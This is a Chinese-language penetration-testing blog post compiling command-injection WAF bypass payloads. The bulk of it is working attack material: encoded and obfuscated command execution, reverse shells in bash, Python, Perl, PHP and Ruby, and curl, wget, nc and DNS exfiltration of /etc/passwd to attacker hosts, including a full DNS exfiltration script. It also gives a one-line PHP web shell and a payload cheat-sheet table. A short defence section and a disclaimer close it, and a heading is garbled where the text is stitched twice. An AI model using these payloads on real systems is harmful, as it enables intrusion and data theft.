---
title: 命令注入绕过技巧汇总
date: 2026-02-01 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
description: 命令注入绕过——空格/关键字/长度限制绕过、无字母数字 Shell、Base64 编码执行与 WAF 规避技巧汇总。
---

## 前言

命令注入（Command Injection）是 Web 安全领域最经典的漏洞类型之一，其危害等级常年位居 OWASP Top 10 前列。随着 WAF（Web Application Firewall）与各类输入过滤规则的普及，简单的 `;cat /etc/passwd` 早已成为历史。本文系统梳理了实战中行之有效的命令注入绕过技巧，涵盖关键字黑名单绕过、长度受限注入、无字母数字 Shell 等核心方法论，并附有完整的绕过技巧参考表。

> **免责声明**：本文所述技术仅用于授权的安全测试与教育目的。未经授权对目标系统进行渗透测试属于违法行为。作者不对读者滥用本文内容导致的后果承担任何法律责任。

---

## 一、命令注入基础

### 1.1 常见命令注入点

命令注入常出现在以下场景：

- Web 应用直接调用系统命令（如 `system()`、`exec()`、`popen()`）
- `ping`、`traceroute`、`nslookup` 等网络诊断功能
- 文件上传处理中的 `ffmpeg`、`imagemagick` 调用
- 邮件发送功能中的 `sendmail` 调用
- 备份/导出功能中的 `tar`、`zip` 调用

description: 命令注入绕过——空格/关键字/长度限制绕过与无字母数字 Shell 技巧。
### 1.2 命令注入连接符总览

| 连接符 | 格式 | 说明 |
|--------|------|------|
| `;` | `cmd1 ; cmd2` | 顺序执行，无论前者成功与否 |
| `\|` | `cmd1 \| cmd2` | 管道，将前者输出作为后者输入 |
| `\|\|` | `cmd1 \|\| cmd2` | 前者失败时执行后者 |
| `&&` | `cmd1 && cmd2` | 前者成功后执行后者 |
| `&` | `cmd1 & cmd2` | 前者后台运行，同时执行后者 |
| `\n` | `cmd1 \n cmd2` | 换行符分隔（URL 编码 `%0a`） |
| `%0d%0a` | CRLF | 回车换行符组合 |
| `` ` `` | `` `cmd` `` | 反引号命令替换 |
| `$()` | `$(cmd)` | 命令替换（现代 shell） |

---

## 二、关键字黑名单绕过

### 2.1 反斜杠绕过

利用反斜杠使关键字在词法层面断裂，但 shell 解析时仍能正常执行：

```bash
# 绕过 cat 关键字
/bin/c\at /etc/passwd
c\a\t /etc/passwd

# 绕过常见命令
w\h\o\a\m\i
i\d
l\s -la
```

### 2.2 单引号绕过

单引号内部的内容在 shell 中被视为字面量，但拼接后仍能作为命令执行：

```bash
# 绕过 cat 关键字
/bin/c'a't /etc/passwd
c'a't /etc/passwd
/usr/bin/c'a't /etc/passwd

# 绕过空格
cat'/etc/passwd'
cat</etc/passwd
c'a't</etc'/pas'swd'
```

### 2.3 双引号绕过

双引号功能类似单引号，但会解析部分特殊字符（如 `$`、`` ` ``）：

```bash
# 绕过 cat 关键字
/bin/c"a"t /etc/passwd
c"a"t /etc/passwd

# 双引号与变量展开结合
c"a"t /etc/pass"w"d
/bin/"who"ami
```

### 2.4 变量拼接绕过

通过定义空变量或拼接环境变量来拆分关键字：

```bash
# 空变量拼接
ca$u /etc/passwd          # $u 为空
/bin/ca${u}t /etc/passwd

# 利用已有环境变量
$IFS                          # 内部字段分隔符，默认为空格/制表符/换行
cat${IFS}/etc/passwd
ca${PATH%%u*}t               # 截取环境变量路径片段

# 常见环境变量利用
${HOME:0:1}                   # 获取 "/"
cd ${HOME:0:1}etc${HOME:0:1}
```

### 2.5 Base64 编码绕过

将恶意命令进行 Base64 编码后解码执行，完全规避关键字检测：

```bash
# 编码命令
echo "cat /etc/passwd" | base64
# 输出: Y2F0IC9ldGMvcGFzc3dkCg==

# 解码并执行
echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | bash
`echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d`
$(echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d)

# 一行命令执行
echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
```

### 2.6 Hex / Octal 编码绕过

```bash
# ASCII 十六进制
echo -e "\x2f\x62\x69\x6e\x2f\x63\x61\x74"  # 输出 /bin/cat
$'\x62\x69\x6e'                               # bin

# 八进制（echo 不支持，需 printf）
printf '\57\142\151\156\57\143\141\164'      # 输出 /bin/cat
$'\57\142\151\156'                            # bin

# 组合使用
$'\x2f\x62\x69\x6e'$'\x2f'$'\x63\x61\x74' /etc/passwd
```

### 2.7 通配符绕过

利用 shell 通配符（globbing）匹配目标命令或文件：

```bash
# 问号通配（匹配单个字符）
/???/c?t /???/p?ss??
/bin/ca? /etc/pass??

# 星号通配（匹配任意字符）
/**/c?t /etc/p****d

# 字符范围匹配
/bin/[a-z][a-z][a-z] /etc/passwd
/usr/bin/c[a]t /etc/p[a]sswd
```

### 2.8 大小写变形绕过

部分 WAF 采用大小写敏感的规则匹配（Windows 环境下尤其有效）：

```bash
# Windows 系统（CMD 大小写不敏感）
cAt /etc/passwd
WhOaMi
NeT uSeR

# Linux 系统（需配合命令路径的大小写变体）
# 利用 ${} 大小写转换（bash 4.0+）
${COMMAND,,}  # 转小写
${command^^}  # 转大写
```

---

## 三、长度受限注入

### 3.1 极短 Payload 构造

当注入点只允许极短字符串输入时（例如 10 字符以内），可采取以下策略：

```bash
# 文件重定向写马（逐字符追加）
>a
>\
>_                 # 依次创建文件名，最后拼成命令
ls -t > a          # 按时间排序写入文件
sh a               # 执行拼接出的命令

# 每步仅需 3 字符左右
```

### 3.2 最短命令技巧

| 目标 | 最短 Payload | 字符数 |
|------|-------------|--------|
| 列出目录 | `ls` | 2 |
| 查看文件 | `cat *` | 5 |
| 查看文件（无空格） | `cat<f` | 5 |
| 下载文件 | `wget 1.1.1.1` | 12 |
| 反弹 Shell（bash） | `bash -i >& /dev/tcp/1.1.1.1/8080 0>&1` | 38+ |
| 最短反弹 Shell | `sh -i>&/dev/tcp/1.1.1.1/8080 0>&1` | 36 |

### 3.3 多步构造法

```bash
# 第 1 步：写入 wget 命令到文件
> w
> g
> e
> t
ls -t>x              # 按创建时间倒序拼出 "wget"
# 第 2 步：用该文件下载完整 payload
sh x 1.1.1.1/a.txt
```

---

## 四、无字母数字 Shell

### 4.1 取反位运算

在 PHP 中常见，利用取反操作符生成任意字符，但 Bash 的思路不同——主要靠通配符与环境变量：

```bash
# 使用 $'\ooo' 八进制构造
$'\154\163'          # 等价于 ls

# 完全没有字母时，利用通配符匹配 /bin 下的命令
/???/??              # 可能匹配 /bin/ls 等
/???/???             # 可能匹配 /bin/cat 等
```

### 4.2 利用特殊变量生成字符

```bash
# ${#} 始终为 0
# ${##} 为 1
# 通过移位和运算逐步构造数字，再映射为 ASCII
__=$'\x2f'             # /
__=$__$'\x62'          # /b
__=$__$'\x69'          # /bi
__=$__$'\x6e'          # /bin
__=$__$'\x2f'$'\x63'$'\x61'$'\x74'  # /bin/cat
$__ /etc/passwd
```

### 4.3 纯 $'\x' 十六进制构造

```bash
# 构造 /bin/cat /etc/passwd 的所有十六进制字节
cmd=$'\x2f\x62\x69\x6e\x2f\x63\x61\x74'
$cmd $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
```

### 4.4 环境变量切片

```bash
# 通过已知环境变量切片获取字母
${PWD}                 # /var/www/html
${PWD:0:1}             # /
${HOME}                # /root 或 /home/user
${HOME:0:1}            # /

# 逐字符构造命令（实战较繁琐，一般用于自动化工具）
```

---

## 五、/dev/tcp 反弹 Shell

### 5.1 核心原理

Bash 内置了 `/dev/tcp` 伪文件系统，可建立 TCP 连接而无需外部工具（nc、socat 等）。

### 5.2 基础反弹 Shell

```bash
# 标准 Bash 反弹 Shell
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1

# 简短版
sh -i >& /dev/tcp/10.0.0.1/4444 0>&1

# 不依赖 bash 完整交互模式
exec 5<>/dev/tcp/10.0.0.1/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### 5.3 WAF 绕过版反弹 Shell

```bash
# Base64 编码反弹 Shell
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=" | base64 -d | bash

# 变量拼接版
A=dev; B=tcp; C=10.0.0.1; D=4444
bash -i >& /$A/$B/$C/$D 0>&1

# 十六进制版
bash -i >& /dev$'\x2f'tcp$'\x2f'10.0.0.1$'\x2f'4444 0>&1
```

### 5.4 多端口 / 多形式反弹

```bash
# UD>### 5.4 多端口 / 多形式反弹

```bash
# UDP 反弹（需目标支持 /dev/udp）
sh -i >& /dev/udp/10.0.0.1/4444 0>&1

# Python 反弹（备用方案）
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl 反弹
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP 反弹
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby 反弹
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## 六、数据外带 — curl / wget

### 6.1 curl 外带数据

```bash
# GET 方式外带文件（URL 中嵌入数据）
curl "http://ATTACKER_IP/$(cat /etc/passwd | base64)"

# POST 方式外带文件
curl -X POST -d "$(cat /etc/passwd)" http://ATTACKER_IP/collect

# 外带含特殊字符的文件（base64 编码避免传输错误）
curl "http://ATTACKER_IP/?d=$(cat /etc/passwd | base64 | tr -d '\n')"

# 逐文件外带当前目录
curl -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# 多文件打包外带
tar czf - /var/www/html | curl -X POST --data-binary @- http://ATTACKER_IP/backup.tar.gz

# 通过请求头外带（绕过部分 URL 长度限制）
curl -H "X-Data: $(cat /etc/passwd | base64 -w0)" http://ATTACKER_IP/
```

### 6.2 wget 外带数据

```bash
# wget 直接 GET（数据在 URL 路径）
wget "http://ATTACKER_IP/$(cat /etc/passwd | base64 -w0)"

# wget POST（需较新版本，--post-data 支持）
wget --post-data="data=$(cat /etc/passwd | base64 -w0)" http://ATTACKER_IP/

# wget 递归下载或自定义 header
wget --header="X-Exfil: $(cat /etc/passwd | base64 -w0)" http://ATTACKER_IP/
```

### 6.3 其他网络工具外带

```bash
# nc 直接传文件
cat /etc/passwd | nc ATTACKER_IP 4444

# telnet 外带
telnet ATTACKER_IP 4444 < /etc/passwd

# nslookup（配合 DNS 外带，见下节）
```

---

## 七、DNS 外带 — Blind 命令注入利器

### 7.1 基本原理

当目标无法出站建立 TCP/HTTP 连接时（不出网），DNS 查询往往仍然允许。通过将命令结果编码为 DNS 域名前缀发起查询，可在攻击者 DNS 服务器上获取数据。

### 7.2 基础 DNS 外带

```bash
# Linux 环境
nslookup "$(cat /etc/passwd | base64 | tr -d '\n').attacker.com"

# 短结果（如 whoami）
nslookup "$(whoami).attacker.com"

# 多级分割（结果过长时分段）
cmd=$(cat /etc/passwd | base64 -w0)
nslookup "part1-${cmd:0:30}.attacker.com"
nslookup "part2-${cmd:30:30}.attacker.com"
```

### 7.3 逐行外带

```bash
# 将文件内容逐行外带
cat /etc/passwd | while read line; do
    nslookup "$(echo $line | base64).attacker.com"
done

# 使用 dig（更灵活）
dig "$(id | base64 -w0).attacker.com" A +short
```

### 7.4 外带命令执行输出

```bash
# 执行命令并外带
cmd="ls -la /home"
nslookup "$($cmd | base64 -w0).attacker.com"

# 脚本化：遍历目标目录
for f in /home/*; do
    nslookup "$(echo $f | base64 -w0).attacker.com"
done
```

### 7.5 攻击端接收配置

```bash
# 攻击机器启动 DNS 监听（tcpdump）
tcpdump -i eth0 -nn dst port 53 | grep attacker.com

# 或使用专用工具
python3 -m http.server 80 &           # 接收 http 请求
tail -f /var/log/named/queries.log    # 查看 DNS 查询日志

# 攻击端抓取并解码
tcpdump -i eth0 -nn dst port 53 -l | \
  awk '{print $NF}' | \
  sed 's/\.attacker\.com\.//' | \
  while read b64; do echo "$b64" | base64 -d; done
```

### 7.6 完整 DNS 外带脚本示例

```bash
#!/bin/bash
# 目标机执行：将结果通过 DNS 外带
ATTACKER_DNS="attacker.com"
TARGET_FILE="/etc/passwd"

DATA=$(cat $TARGET_FILE | base64 -w0 | tr '+/=' '.-_')
CHUNK_SIZE=30
for i in $(seq 0 $CHUNK_SIZE ${#DATA}); do
    CHUNK="${DATA:$i:$CHUNK_SIZE}"
    nslookup "${CHUNK}.$ATTACKER_DNS" > /dev/null 2>&1
    sleep 0.2
done
```

---

## 八、其他高级绕过技巧

### 8.1 空格绕过

| 技巧 | 示例 |
|------|------|
| `${IFS}` | `cat${IFS}/etc/passwd` |
| `$IFS` | `cat$IFS/etc/passwd` |
| `<` 输入重定向 | `cat</etc/passwd` |
| `<>` 重定向 | `cat<>/etc/passwd` |
| 花括号扩展 | `{cat,/etc/passwd}` |
| Tab (`%09`) | `cat%09/etc/passwd` |
| 变量绕空格 | `X=$'\x20'; cat${X}/etc/passwd` |

### 8.2 路径穿越与文件读取

```bash
# 构造 /etc/passwd 路径
/etc/passwd
/./etc/./passwd
//etc//passwd
/../etc/passwd/..
/etc/../etc/passwd/

# 符号链接利用（如果可创建）
ln -s /etc/passwd /tmp/link && cat /tmp/link
```

### 8.3 命令分隔符替换

```bash
# \x0a 换行替代
echo "ls%0acat%20/etc/passwd" | ...

# 管道与逻辑运算符
ping 127.0.0.1 | cat /etc/passwd
ping 127.0.0.1 || cat /etc/passwd
ping 127.0.0.1 && cat /etc/passwd
ping 127.0.0.1 & cat /etc/passwd
ping 127.0.0.1 %26%26 cat /etc/passwd
```

### 8.4 利用邮件与写入

```bash
# mail 命令写文件
mail -s "x" user@localhost < /tmp/result.txt

# tee 分流写入
cat /etc/passwd | tee /tmp/copy.txt

# dd 写文件
dd if=/etc/passwd of=/tmp/pass.bak

# 追加写入 Web 可访问目录
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
```

---

## 九、完整绕过技巧参考表

| 场景 | 绕过技术 | 示例 Payload |
|------|---------|-------------|
| 过滤 `cat` | 反斜杠 | `c\a\t /etc/passwd` |
| 过滤 `cat` | 单引号 | `c'a't /etc/passwd` |
| 过滤 `cat` | 双引号 | `c"a"t /etc/passwd` |
| 过滤 `cat` | 变量拼接 | `ca$u /etc/passwd` |
| 过滤 `cat` | Base64 | `echo Y2F0... \| base64 -d \| sh` |
| 过滤 `cat` | 通配符 | `/???/??? /???/??????` |
| 过滤 `cat` | 十六进制 | `$'\x63\x61\x74' /etc/passwd` |
| 过滤空格 | `${IFS}` | `cat${IFS}/etc/passwd` |
| 过滤空格 | `<` 重定向 | `cat</etc/passwd` |
| 过滤空格 | Tab | `cat%09/etc/passwd` |
| 过滤空格 | `%20` 两次编码 | `cat%2520/etc/passwd` |
| 过滤 `/` | 环境变量 | `cat ${HOME:0:1}etc${HOME:0:1}passwd` |
| 过滤 `/` | `;cd` 切换 | `cd etc; cd ..; cat passwd` |
| 过滤回显 | DNS 外带 | `nslookup $(cmd \| base64).attacker.com` |
| 过滤回显 | curl GET | `curl http://IP/$(cmd \| base64)` |
| 过滤回显 | curl POST | `curl -d "$(cmd)" http://IP/` |
| 过滤回显 | 文件写入 + 访问 | `cmd > /var/www/html/out.txt` |
| 过滤回显 | /dev/tcp 反弹 | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| 过滤 `bash` | 替代 Shell | `sh` / `dash` / `zsh` / `busybox` |
| 过滤 `sh`/`bash` | 脚本语言 | `python` / `perl` / `ruby` / `php` |
| 过滤 `$()` | 反引号 | `` `cat /etc/passwd` `` |
| 过滤 反引号 | `$()` | `$(cat /etc/passwd)` |
| 过滤 `&` `\|` | 换行 | `%0acat%20/etc/passwd` |
| 过滤 `;` | `%0a` | `%0acat%20/etc/passwd` |
| 长度限制 < 5 | 文件创建拼接 | `>a; >_; ls -t>f; sh f` |
| 长度限制 | wget 拉取 | `wget IP/a; sh a` |
| 无字母数字 | 通配符 | `/?[a-z][a-z]/[a-z]?` |
| 无字母数字 | 八进制/十六进制 | `$'\154\163'` (ls) |
| WAF 阻断出站 | DNS 外带 | `nslookup $(data).evil.com` |
| WAF 阻断出站 | ICMP 隧道 | `ping -p $(xxd -p file) IP` |
| 文件包含 | `file://` 协议 | `curl file:///etc/passwd` |
| 文件包含 | `/proc` 读取 | `cat /proc/self/environ` |
| 进程注入 | `tee` / `dd` | `cmd \| tee /proc/self/fd/0` |

---

## 十、防御与检测建议

开发层面：

1. **避免直接调用系统命令**：优先使用语言内置 API 实现功能
2. **白名单校验**：仅允许预定义的命令和参数，而非试图过滤黑名单
3. **参数化调用**：使用参数数组形式调用命令（如 Python 的 `subprocess.run(["ls", arg])`），避免 shell 解析
4. **最小权限**：Web 进程以最低权限运行，限制可执行命令范围

运维与检测：

5. **WAF 规则**：不仅检测常见关键字，还应覆盖编码变体、连接符、通配符
6. **RASP**：运行时应用自我保护，监控进程创建与异常子进程行为
7. **网络监控**：监控出站 DNS 查询频率、长度异常的域名请求、非白名单出站连接
8. **日志审计**：记录所有命令执行日志，便于事后追溯与告警

---

## 写在最后

命令注入绕过是一场持续的攻防博弈。攻击者不断利用 Shell 的灵活特性寻找新的绕过方式，防御方则需要从源头消除命令执行的可能。本文覆盖的技巧在实际渗透测试项目中屡经验证，建议读者在安全评估中合理使用、在安全建设中针对性加固。

理解绕过不是为了攻击，而是为了更好地防御。

---

*本文发表于 2026 年 2 月 1 日，部分技术细节可能随软件版本更新而变化。所有测试均在授权环境中完成。*
